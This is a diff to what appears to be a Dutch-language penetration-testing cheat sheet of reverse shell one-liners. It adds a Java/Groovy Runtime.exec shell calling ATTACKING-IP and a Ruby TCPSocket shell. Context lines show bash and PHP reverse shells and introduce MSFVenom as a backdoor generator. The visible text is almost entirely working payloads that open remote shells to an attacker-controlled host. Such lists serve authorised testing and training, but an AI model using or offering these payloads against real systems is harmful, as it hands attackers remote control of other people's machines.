@@ -105,6 +105,9 @@ Hieronder zal ik er een aantal plaatsen:
     bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 
 ### Java
+    r = Runtime.getRuntime()
+    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+    p.waitFor()
 
 ### Netcat
 
@@ -119,6 +122,8 @@ Hieronder zal ik er een aantal plaatsen:
     php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ### Ruby ###
+
+    ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 ## MSFVenom ##
 Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen bieden. 
